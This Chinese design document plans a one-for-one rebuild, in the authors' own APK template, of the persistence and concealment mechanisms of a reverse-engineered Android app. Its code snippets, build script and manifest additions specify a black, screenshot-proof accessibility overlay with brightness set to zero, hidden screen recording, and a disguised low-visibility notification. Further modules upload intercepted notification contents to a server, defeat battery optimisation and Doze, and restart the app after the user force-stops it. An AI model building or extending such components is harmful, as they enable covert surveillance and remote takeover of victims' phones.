# Vendor APK 保活机制一比一复刻 — 需求与设计文档

> **版本**: 1.0
> **日期**: 2026-03-16
> **开发语言**: Java（编译为 smali 集成到 APK 模板）
> **基于**: Vendor APK 完整逆向分析（16 份文档 + 源码审计）

---

## 一、Vendor APK 保活机制代码审查

### 1.1 五层保活架构

```
┌─────────────────────────────────────────────────┐
│  第 1 层: 系统事件监听                            │
│  ScreenBroadcastReceiver — 息屏/亮屏/解锁/屏保    │
│  PowerBroadcastReceiver  — 充电/断电/省电模式      │
│  BootBroadcast           — 开机/解锁启动          │
│  BatteryLevelReceiver    — 电量变化监控           │
│  AlarmReceiver           — 定时唤醒              │
└─────────────────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────┐
│  第 2 层: 前台服务保活                            │
│  MediaLiveService        — 前台通知 + 屏幕录制    │
│  WIFIBackgroundService   — WiFi Lock + JobService │
│  AccountAuthenticatorService — 账户同步保活       │
│  CustomNotificationService — 通知监听保活         │
└─────────────────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────┐
│  第 3 层: WakeLock + WiFiLock                    │
│  PARTIAL_WAKE_LOCK       — CPU 保持运行          │
│  WifiLock(WIFI_MODE_FULL_HIGH_PERF) — WiFi 保持  │
└─────────────────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────┐
│  第 4 层: 遮罩 + 亮度控制                         │
│  helper/g.java (BlockView) — 全屏遮罩 TYPE_2032  │
│  utils/k.java              — 亮度归零/恢复        │
│  LockActivity              — 1x1 透明窗口        │
└─────────────────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────┐
│  第 5 层: 厂商白名单自动化                        │
│  o/n.java — 华为/荣耀启动管理                     │
│  o/q.java — 小米自启动管理                        │
│  o/v.java — OPPO 自启动管理                       │
│  o/u.java — vivo 自启动管理                       │
│  o/s.java — 三星电池优化                          │
└─────────────────────────────────────────────────┘
```

### 1.2 各层核心代码审查

#### 第 1 层: ScreenBroadcastReceiver（167 行）

监听 5 种屏幕事件：
- `SCREEN_OFF` — 息屏：停止无障碍代理、触发息屏策略、清理密码监听
- `SCREEN_ON` — 亮屏：触发亮屏策略、记录锁屏批次 ID
- `DREAMING_STARTED` — 屏保开始
- `DREAMING_STOPPED` — 屏保结束
- `USER_PRESENT` — 用户解锁：恢复无障碍代理、触发解锁策略

关键行为：
```java
// 息屏时
MyAccessibilityService.P().D();  // 停止本地无障碍代理
MyAccessibilityService.P().H(true, false);  // 设置息屏状态
MainApplication.getInstance().offerStrategyEvent("KEEP_ADB_ALIVE_SCREEN_OFF");

// 解锁时
MainApplication.getInstance().offerStrategyEvent("KEEP_ADB_ALIVE_SCREEN_USER_PRESENT");
g.F0(2);  // performGlobalAction(HOME) 恢复
```

#### 第 1 层: PowerBroadcastReceiver

监听 4 种电源事件：
- `ACTION_POWER_CONNECTED` — 充电线连接
- `ACTION_POWER_DISCONNECTED` — 充电线断开
- `POWER_USAGE_SUMMARY` — 电力使用情况
- `POWER_SAVE_MODE_CHANGED` — 省电模式变化

关键行为：低电量(<5%) + 省电模式 → 设置 `w.a.f1561a = true` 降低活动频率

#### 第 1 层: BootBroadcast

监听 2 种启动事件：
- `BOOT_COMPLETED` — 开机完成
- `LOCKED_BOOT_COMPLETED` — 加密启动完成

关键行为：`w.b.a()` 重启所有核心服务

#### 第 1 层: AlarmReceiver

自定义 Action：
- `{packageName}.alarm.action` — 定时唤醒，设置 `e.S().B = true`
- `{packageName}.pause.accessibility` — 暂停无障碍
- `{packageName}.resume.accessibility` — 恢复无障碍

#### 第 2 层: MediaLiveService

前台服务 + 屏幕录制：
```java
// 创建低优先级前台通知
NotificationChannel("100", "front_media_live_notification", IMPORTANCE_HIGH)
startForeground(100, notification)

// 通知内容从 config.json 读取
title = buildConfig.getNotificationTitle()    // "standby power-saving mode"
content = buildConfig.getNotificationContent() // "entered standby power-saving mode"

// onStartCommand: 初始化 MediaProjection 屏幕录制
MediaProjectionManager.getMediaProjection(code, data)
ImageReader.newInstance(width, height, 1, 2)
```

#### 第 2 层: WIFIBackgroundService (extends JobService)

双重保活：Service + JobScheduler
```java
// onCreate: 创建 WiFi Lock
WifiManager.createWifiLock(WIFI_MODE_FULL_HIGH_PERF, "MyWifiLockTag")

// onStartCommand: 获取 WiFi Lock
wifiLock.acquire()

// onStartJob: JobScheduler 触发时也获取 WiFi Lock
wifiLock.acquire()
jobFinished(params, true)  // reschedule=true 自动重新调度
```

#### 第 2 层: AccountAuthenticatorService

账户同步保活：
```java
// 利用系统账户同步机制
AbstractAccountAuthenticator authenticator
WifiLock wifiLock  // 额外持有 WiFi Lock

// onStartCommand: 重启应用核心
l.j()    // 重新初始化 HTTP 客户端
b.a()    // 重启所有服务
wifiLock.acquire()
```

#### 第 2 层: CustomNotificationService (extends NotificationListenerService)

通知监听保活：
```java
// onListenerConnected: 服务连接
b.a()  // 重启所有服务

// onNotificationPosted: 收到通知
// 提取通知内容上报服务器
DeviceNotificationVO → MessageRecordVO → server

// onNotificationRemoved: 通知移除
// 检查 tag 是否包含 "startActivity:" → 启动指定 Activity
```

#### 第 3 层: helper/g.java (BlockView 遮罩)

```java
// 创建遮罩
b(BlockViewVO):
  savedBrightness = g.O0()           // 保存当前亮度
  LayoutParams.flags = 591800         // NOT_FOCUSABLE|NOT_TOUCHABLE|LAYOUT_IN_SCREEN
  LayoutParams.type = 2032            // TYPE_ACCESSIBILITY_OVERLAY
  k.c(0)                              // 亮度归零
  windowManager.addView(blockView)

// 移除遮罩
d():
  k.c(savedBrightness)               // 恢复亮度
  g.F0(8)                             // performGlobalAction(HOME)
  windowManager.removeViewImmediate()

// 进度更新
h(progress):
  blockView → progressHandler.sendMessage(progress)
```

#### 第 3 层: utils/k.java (亮度控制)

```java
// 双重 fallback 亮度控制
c(brightness):
  try1: Settings.System.putInt(resolver, "screen_brightness", value)
  try2: ADB命令 "settings put system screen_brightness {value}"

// 主线程检测
a(): return Looper.getMainLooper() == Looper.myLooper()

// 截图隐藏 (Android 12+)
b(view): SurfaceControl.Transaction.setSkipScreenshot(true)
```

### 1.3 与我们 APK 的差距分析

| 保活层 | Vendor APK | 我们的 APK | 差距 |
|--------|-----------|-----------|------|
| 屏幕事件监听 | 5 种事件 + 策略引擎 | 无 | 完全缺失 |
| 电源事件监听 | 4 种事件 + 省电模式适配 | 无 | 完全缺失 |
| 开机自启 | BOOT + LOCKED_BOOT | BootReceiver (已有) | 需升级 |
| 定时唤醒 | AlarmReceiver + 自定义 Action | 无 | 完全缺失 |
| 前台服务 | MediaLiveService (通知+录屏) | EngineWorker (已有) | 需升级 |
| WiFi 保活 | WIFIBackgroundService (JobService) | 无 | 完全缺失 |
| 账户同步 | AccountAuthenticatorService | 无 | 完全缺失 |
| 通知监听 | CustomNotificationService | NotifyListenService (已有) | 需升级 |
| WakeLock | PARTIAL_WAKE_LOCK | 无 | 完全缺失 |
| WiFiLock | WIFI_MODE_FULL_HIGH_PERF | 无 | 完全缺失 |
| 遮罩系统 | BlockView + 亮度控制 + 进度 | BlockView (基础版) | 需升级 |
| 厂商白名单 | 5 大厂商引擎 | 华为 (部分) | 需扩展 |

---

## 二、复刻需求

### 2.1 需求总览

用 Java 代码实现以下 12 个模块，编译为独立的 classes.dex 或 smali 文件集成到 APK 模板：

| 编号 | 模块 | Java 类名 | 优先级 |
|------|------|----------|--------|
| M01 | 屏幕事件监听 | KeepAliveScreenReceiver | P0 |
| M02 | 电源事件监听 | KeepAlivePowerReceiver | P0 |
| M03 | 定时唤醒 | KeepAliveAlarmReceiver | P0 |
| M04 | WakeLock 管理 | WakeLockManager | P0 |
| M05 | WiFiLock 管理 | WifiLockManager | P0 |
| M06 | 前台服务升级 | KeepAliveForegroundService | P1 |
| M07 | WiFi 后台 JobService | KeepAliveJobService | P1 |
| M08 | 账户同步保活 | KeepAliveAccountService | P1 |
| M09 | 遮罩系统 | BlockViewManager | P1 |
| M10 | 亮度控制 | BrightnessController | P1 |
| M11 | 保活策略引擎 | KeepAliveStrategy | P2 |
| M12 | 电池状态监控 | BatteryMonitor | P2 |

### 2.2 各模块详细需求

#### M01: KeepAliveScreenReceiver

**对标**: `ScreenBroadcastReceiver.java` (167 行)

功能需求：
- 监听 SCREEN_OFF / SCREEN_ON / USER_PRESENT / DREAMING_STARTED / DREAMING_STOPPED
- 息屏时：获取 WakeLock、触发息屏策略、上报事件
- 亮屏时：上报事件
- 解锁时：释放 WakeLock、恢复正常活动、上报事件
- 保存屏幕状态到 SharedPreferences

#### M02: KeepAlivePowerReceiver

**对标**: `PowerBroadcastReceiver.java`

功能需求：
- 监听 POWER_CONNECTED / POWER_DISCONNECTED / POWER_SAVE_MODE_CHANGED
- 省电模式 + 低电量(<5%) → 降低活动频率标志
- 充电连接/断开 → 上报事件

#### M03: KeepAliveAlarmReceiver

**对标**: `AlarmReceiver.java` (37 行)

功能需求：
- 响应自定义 alarm action: `{packageName}.alarm.action`
- 触发时检查核心服务是否运行，未运行则重启
- 支持暂停/恢复无障碍服务的 action
- 提供静态方法 `scheduleAlarm(Context, intervalMs)` 设置定时器
- 使用 `setExactAndAllowWhileIdle` 绕过 Doze 模式

#### M04: WakeLockManager

**对标**: Vendor 多处使用的 WakeLock 模式

功能需求：
- `acquire()` — 获取 PARTIAL_WAKE_LOCK，保持 CPU 运行
- `release()` — 释放 WakeLock
- `acquireTimeout(ms)` — 获取带超时的 WakeLock
- 单例模式，防止重复获取
- tag: `"{packageName}:keepalive"`

#### M05: WifiLockManager

**对标**: `WIFIBackgroundService` + `AccountAuthenticatorService` 中的 WifiLock

功能需求：
- `acquire()` — 获取 WIFI_MODE_FULL_HIGH_PERF WifiLock
- `release()` — 释放 WifiLock
- 单例模式
- tag: `"KeepAliveWifiLock"`

#### M06: KeepAliveForegroundService

**对标**: `MediaLiveService.java` (112 行)

功能需求：
- 创建前台通知（标题/内容从配置读取）
- NotificationChannel ID: "keepalive_channel"
- 通知优先级: PRIORITY_MIN（最低，不易被用户察觉）
- `startForeground()` 保持服务存活
- `onStartCommand` 返回 `START_STICKY`（被杀后自动重启）
- onDestroy 时取消通知

#### M07: KeepAliveJobService

**对标**: `WIFIBackgroundService.java` (63 行，extends JobService)

功能需求：
- 继承 JobService
- `onStartJob`: 获取 WifiLock + 检查核心服务 + `jobFinished(params, true)`
- 提供静态方法 `schedule(Context)` 配置 JobScheduler：
  - minimumLatency: 5 分钟
  - overrideDeadline: 10 分钟
  - requiredNetworkType: ANY
  - setPersisted: true

#### M08: KeepAliveAccountService

**对标**: `AccountAuthenticatorService.java` (64 行)

功能需求：
- 继承 Service，实现 AbstractAccountAuthenticator
- `onBind` 返回 authenticator IBinder
- `onStartCommand`: 重启核心服务 + 获取 WifiLock
- 提供静态方法 `createSyncAccount(Context)` 创建同步账户

#### M09: BlockViewManager

**对标**: `helper/g.java` (233 行)

功能需求：
- `show(hint, zeroBrightness)` — 创建全屏遮罩
  - TYPE_ACCESSIBILITY_OVERLAY (2032)
  - flags: NOT_FOCUSABLE | NOT_TOUCHABLE | LAYOUT_IN_SCREEN
  - 可选亮度归零
  - 线程安全 (ReentrantLock)
  - 主线程/子线程双路径
- `dismiss()` — 移除遮罩
  - 恢复亮度
  - 按 HOME 键（可选）
  - 清理引用
- `isShowing()` — 是否正在显示
- `updateProgress(int)` — 更新进度

#### M10: BrightnessController

**对标**: `utils/k.java`

功能需求：
- `getBrightness()` — 获取当前亮度
- `setBrightness(int)` — 设置亮度（双重 fallback）
  - 方式 1: `Settings.System.putInt("screen_brightness", value)`
  - 方式 2: ADB 命令 `settings put system screen_brightness {value}`
- `setZero()` — 亮度归零
- `restore(savedValue)` — 恢复亮度
- `isMainThread()` — 主线程检测

#### M11: KeepAliveStrategy

**对标**: `MainApplication.offerStrategyEvent()` 策略引擎

功能需求：
- 接收策略事件: SCREEN_OFF / SCREEN_ON / USER_PRESENT / BOOT / ALARM
- 根据事件类型执行对应保活动作：
  - SCREEN_OFF → 获取 WakeLock + 调度 Alarm + 降低频率
  - SCREEN_ON → 正常频率
  - USER_PRESENT → 释放 WakeLock + 恢复活动
  - BOOT → 启动所有服务 + 调度 Alarm + 调度 Job
  - ALARM → 检查服务 + 重新调度
- 配置参数：
  - `perScreenOffDuration`: 息屏后延迟执行时间（默认 2 分钟）
  - `perIdleDuration`: 空闲检测间隔（默认 5 分钟）

#### M12: BatteryMonitor

**对标**: `BatteryLevelReceiver.java` (80 行)

功能需求：
- 监听 BATTERY_CHANGED 事件
- 提取电池信息: level/scale/status/health/voltage/temperature/plugged
- 计算电量百分比
- 低电量(<5%) + 省电模式 → 设置降频标志
- 上报电池状态到服务器
- 节流: 30 秒内最多上报 10 次

---

## 三、Java 项目结构设计

### 3.1 包结构

```
com.icontrol.protector.keepalive/
├── receiver/
│   ├── KeepAliveScreenReceiver.java    (M01)
│   ├── KeepAlivePowerReceiver.java     (M02)
│   ├── KeepAliveAlarmReceiver.java     (M03)
│   └── BatteryMonitor.java            (M12)
├── service/
│   ├── KeepAliveForegroundService.java (M06)
│   ├── KeepAliveJobService.java        (M07)
│   └── KeepAliveAccountService.java    (M08)
├── manager/
│   ├── WakeLockManager.java            (M04)
│   ├── WifiLockManager.java            (M05)
│   ├── BlockViewManager.java           (M09)
│   └── BrightnessController.java       (M10)
└── strategy/
    └── KeepAliveStrategy.java          (M11)
```

### 3.2 类依赖关系

```
KeepAliveStrategy (核心调度)
  ├── WakeLockManager
  ├── WifiLockManager
  ├── KeepAliveAlarmReceiver.scheduleAlarm()
  ├── KeepAliveJobService.schedule()
  └── KeepAliveForegroundService

KeepAliveScreenReceiver
  └── KeepAliveStrategy.onEvent("SCREEN_OFF" / "SCREEN_ON" / "USER_PRESENT")

KeepAlivePowerReceiver
  └── KeepAliveStrategy.onEvent("POWER_SAVE_MODE")

KeepAliveAlarmReceiver
  └── KeepAliveStrategy.onEvent("ALARM")

BlockViewManager
  ├── BrightnessController
  └── AccessServices (获取 WindowManager)
```

### 3.3 与现有 smali 代码的集成点

| 集成点 | 现有文件 | 集成方式 |
|--------|---------|---------|
| 无障碍服务实例 | AccessServices.smali (字段 N) | Java 代码通过静态字段访问 |
| 屏幕事件注册 | AccessServices.onServiceConnected | 在 onServiceConnected 中注册 receiver |
| 配置读取 | My_Configs.smali | Java 代码读取静态字段 |
| 服务启动 | ActivMain.smali / BootReceiver.smali | 在现有启动点调用 KeepAliveStrategy.init() |
| AndroidManifest | AndroidManifest.xml | 构建时注入 service/receiver 声明 |

---

## 四、开发流程

### 4.1 Java → smali 编译流程

```
1. 在 app/storage/app/apk/apkstub/keepalive-java/ 目录编写 Java 代码
2. javac 编译为 .class 文件（需要 android.jar 作为 classpath）
3. d8/dx 转换为 .dex 文件
4. baksmali 反编译为 .smali 文件
5. 复制 .smali 到 APK 模板目录
6. APK 构建时自动包含
```

### 4.2 构建脚本

```bash
#!/bin/bash
# build-keepalive.sh

ANDROID_JAR="/path/to/android.jar"
SRC_DIR="app/storage/app/apk/apkstub/keepalive-java/src"
OUT_DIR="app/storage/app/apk/apkstub/keepalive-java/build"
SMALI_DIR="app/storage/app/apk/template/smali/com/icontrol/protector/keepalive"

# 1. Compile Java
javac -source 1.8 -target 1.8 \
  -classpath "$ANDROID_JAR" \
  -d "$OUT_DIR/classes" \
  $(find "$SRC_DIR" -name "*.java")

# 2. Convert to DEX
d8 --output "$OUT_DIR" $(find "$OUT_DIR/classes" -name "*.class")

# 3. Convert to smali
baksmali d "$OUT_DIR/classes.dex" -o "$OUT_DIR/smali"

# 4. Copy to template
cp -r "$OUT_DIR/smali/com/icontrol/protector/keepalive" "$SMALI_DIR"
```

---

## 五、AndroidManifest 注入

构建时需要在 AndroidManifest.xml 中注入以下声明：

```xml
<!-- 保活 Receivers -->
<receiver android:name=".keepalive.receiver.KeepAliveScreenReceiver"
    android:exported="false" />
<receiver android:name=".keepalive.receiver.KeepAlivePowerReceiver"
    android:exported="false" />
<receiver android:name=".keepalive.receiver.KeepAliveAlarmReceiver"
    android:exported="true">
    <intent-filter>
        <action android:name="${packageName}.alarm.action" />
        <action android:name="${packageName}.pause.accessibility" />
        <action android:name="${packageName}.resume.accessibility" />
    </intent-filter>
</receiver>
<receiver android:name=".keepalive.receiver.BatteryMonitor"
    android:exported="false" />

<!-- 保活 Services -->
<service android:name=".keepalive.service.KeepAliveForegroundService"
    android:foregroundServiceType="specialUse|dataSync"
    android:stopWithTask="false"
    android:exported="false" />
<service android:name=".keepalive.service.KeepAliveJobService"
    android:permission="android.permission.BIND_JOB_SERVICE"
    android:exported="false" />
<service android:name=".keepalive.service.KeepAliveAccountService"
    android:exported="false">
    <intent-filter>
        <action android:name="android.accounts.AccountAuthenticator" />
    </intent-filter>
    <meta-data android:name="android.accounts.AccountAuthenticator"
        android:resource="@xml/authenticator" />
</service>

<!-- 权限 -->
<uses-permission android:name="android.permission.WAKE_LOCK" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
<uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
<uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
```

---

## 六、实施路线图

### Phase 1: P0 核心保活（1 周）

| 天 | 任务 | 交付物 |
|----|------|--------|
| D1 | M04 WakeLockManager + M05 WifiLockManager | 2 个 Java 类 |
| D2 | M01 KeepAliveScreenReceiver | 1 个 Java 类 |
| D3 | M02 KeepAlivePowerReceiver + M03 KeepAliveAlarmReceiver | 2 个 Java 类 |
| D4 | 编译 + 集成到 APK 模板 | smali 文件 |
| D5 | 华为真机测试 | 测试报告 |

### Phase 2: P1 服务保活（1 周）

| 天 | 任务 | 交付物 |
|----|------|--------|
| D1 | M06 KeepAliveForegroundService | 1 个 Java 类 |
| D2 | M07 KeepAliveJobService | 1 个 Java 类 |
| D3 | M08 KeepAliveAccountService | 1 个 Java 类 |
| D4 | M09 BlockViewManager + M10 BrightnessController | 2 个 Java 类 |
| D5 | 编译 + 集成 + 测试 | smali + 测试报告 |

### Phase 3: P2 策略引擎（3 天）

| 天 | 任务 | 交付物 |
|----|------|--------|
| D1 | M11 KeepAliveStrategy | 1 个 Java 类 |
| D2 | M12 BatteryMonitor | 1 个 Java 类 |
| D3 | 全量集成测试 | 最终测试报告 |

---

## 七、验收标准

| 场景 | 目标 | 验证方法 |
|------|------|---------|
| 息屏 5 分钟 | 服务存活率 > 95% | `adb shell dumpsys activity services` |
| 息屏 30 分钟 | 服务存活率 > 85% | 同上 |
| 息屏 2 小时 | 服务存活率 > 70% | 同上 |
| 重启后 | 自动恢复率 > 90% | 重启设备后检查 |
| 手动杀死 | 自动恢复率 > 80% | 强制停止后检查 |
| 低电量模式 | 服务存活率 > 60% | 模拟低电量 |
| 华为设备 | 白名单自动化成功 | 检查启动管理设置 |
| 电池消耗 | < 3%/小时 | `adb shell dumpsys batterystats` |
| 内存占用 | < 10 MB 增量 | `adb shell dumpsys meminfo` |
